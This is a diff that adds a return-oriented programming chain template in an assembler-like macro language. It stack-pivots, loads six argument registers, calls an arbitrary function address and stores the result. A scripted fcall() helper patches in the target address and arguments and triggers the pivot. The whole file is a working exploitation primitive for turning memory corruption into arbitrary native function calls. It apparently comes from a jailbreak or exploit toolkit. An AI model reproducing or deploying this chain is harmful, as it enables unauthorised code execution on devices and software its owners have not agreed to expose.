@@ -1,0 +1,59 @@
+$$var retbuf = malloc(8);
+
+pop rsp
+dp start
+
+db bytes(256)
+
+start:
+pop rcx
+dp rdi_bak
+mov [rcx], rdi
+
+pop rdi
+$$var arg1_offset = SP_OFFSET;
+dq 0
+
+pop rsi
+$$var arg2_offset = SP_OFFSET;
+dq 0
+
+pop rdx
+$$var arg3_offset = SP_OFFSET;
+dq 0
+
+pop rcx
+$$var arg4_offset = SP_OFFSET;
+dq 0
+
+pop r8
+$$var arg5_offset = SP_OFFSET;
+dq 0
+
+pop r9
+$$var arg6_offset = SP_OFFSET;
+dq 0
+
+$$var faddr_offset = SP_OFFSET;
+dq 0
+
+pop rdi
+rdi_bak:
+dq 0
+pop rsi
+$retbuf
+mov [rsi], rax
+$pivot_addr
+
+$$function fcall(faddr, arg1, arg2, arg3, arg4, arg5, arg6)
+$${
+$$  write_ptr_at(ropchain+faddr_offset, faddr);
+$$  write_ptr_at(ropchain+arg1_offset, arg1);
+$$  write_ptr_at(ropchain+arg2_offset, arg2);
+$$  write_ptr_at(ropchain+arg3_offset, arg3);
+$$  write_ptr_at(ropchain+arg4_offset, arg4);
+$$  write_ptr_at(ropchain+arg5_offset, arg5);
+$$  write_ptr_at(ropchain+arg6_offset, arg6);
+$$pivot(ropchain);
+$$  return read_mem(retbuf, 8);
+$$}
